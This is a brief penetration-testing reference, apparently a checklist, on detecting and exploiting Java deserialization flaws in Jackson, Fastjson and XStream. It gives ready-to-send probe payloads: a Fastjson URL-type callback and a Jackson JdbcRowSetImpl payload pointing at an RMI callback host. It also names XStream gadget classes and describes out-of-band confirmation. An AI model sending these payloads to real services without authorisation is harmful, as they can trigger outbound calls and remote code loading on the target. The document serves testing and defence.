# Java Deserialization: Jackson / Fastjson / XStream

## Scope
Detection and exploitation of Java JSON/XML deserialization in:
- Jackson (ObjectMapper.readValue with default typing enabled)
- Fastjson (JSON.parseObject / autoType)
- XStream (fromXML without security framework)

## Signals
- Content-Type application/json or application/xml with polymorphic type fields (@type, @class).
- Stack traces mentioning com.fasterxml.jackson, com.alibaba.fastjson, com.thoughtworks.xstream.
- Error messages revealing gadget classes (e.g. TemplatesImpl).

## Detection
1. Send a minimal polymorphic probe: {"@type":"java.net.URL","val":"http://CALLBACK/x"} (Fastjson).
2. Jackson: {"@class":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://CALLBACK/x"} when default typing active.
3. XStream: <java.util.PriorityQueue> or <sun.reflect.annotation.AnnotationInvocationHandler> payloads.

## OOB validation
Use callback_host for DNS/HTTP callbacks. Confirm gadget execution via interactsh/collaborator.

## False positives
- Type info disabled; whitelist of allowed types.
- Fastjson safeMode enabled.

## References
- ysoserial, marshalsec, Fastjson autoType bypass research.
